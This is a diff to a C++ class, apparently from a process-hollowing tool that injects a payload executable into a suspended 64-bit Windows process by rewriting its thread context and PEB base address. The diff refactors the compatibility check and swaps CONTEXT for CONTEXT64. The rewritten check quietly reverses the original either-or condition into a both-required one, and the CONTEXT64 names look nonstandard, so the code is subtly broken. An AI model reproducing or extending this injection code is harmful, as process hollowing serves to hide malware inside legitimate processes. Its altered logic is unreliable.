@@ -19,11 +19,8 @@ Hollowing64Bit::Hollowing64Bit(const std::string& targetPath, const std::string&
     {
         throw ImageWindowsBitnessException("Cannot work with 64 bit images on a 32 bit Windows build!");
     }
-
-    if (!AreProcessesCompatible())
-    {
-        throw IncompatibleImagesException("The processes are incompatible!");
-    }
+    
+    ValidateCompatibility();
 }
 
 void Hollowing64Bit::hollow()
@@ -119,8 +116,8 @@ void Hollowing64Bit::WriteTargetProcessHeaders(PVOID targetBaseAddress, PBYTE so
 
 void Hollowing64Bit::UpdateTargetProcessEntryPoint(PVOID newEntryPointAddress)
 {
-    CONTEXT threadContext;
-    threadContext.ContextFlags = CONTEXT_ALL;
+    CONTEXT64 threadContext;
+    threadContext.ContextFlags = CONTEXT64_ALL;
 
     if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
     {
@@ -237,8 +234,8 @@ void Hollowing64Bit::ProcessTargetRelocationBlock(PBASE_RELOCATION_BLOCK baseRel
 
 void Hollowing64Bit::UpdateBaseAddressInTargetPEB(PVOID processNewBaseAddress)
 {
-    CONTEXT threadContext;
-    threadContext.ContextFlags = CONTEXT_ALL;
+    CONTEXT64 threadContext;
+    threadContext.ContextFlags = CONTEXT64_ALL;
 
     if (0 == GetThreadContext(_targetProcessInformation.hThread, &threadContext))
     {
@@ -268,10 +265,20 @@ WORD Hollowing64Bit::GetPEFileSubsystem(const PBYTE fileBuffer)
     return ntHeaders->OptionalHeader.Subsystem;
 }
 
-bool Hollowing64Bit::AreProcessesCompatible()
+bool Hollowing64Bit::ValidateCompatibility()
 {
     WORD payloadSubsystem = GetPEFileSubsystem(_payloadBuffer);
 
-    return (_isTarget64Bit && _isPayload64Bit) && ((IMAGE_SUBSYSTEM_WINDOWS_GUI == payloadSubsystem) ||
-        (payloadSubsystem == GetProcessSubsystem(_targetProcessInformation.hProcess)));
+    if (!_isTarget64Bit || !_isPayload64Bit)
+    {
+        throw IncompatibleImagesException(!_isTarget64Bit ? "The target is not 64-bit!" : "The payload is not 64-bit!");
+    }
+
+    if (IMAGE_SUBSYSTEM_WINDOWS_GUI != payloadSubsystem ||
+        payloadSubsystem != GetProcessSubsystem(_targetProcessInformation.hProcess))
+    {
+        throw IncompatibleImagesException("The processes' subsystem are'nt the same, or the payload's subsystem is not GUI!");
+    }
+
+    return true;
 }
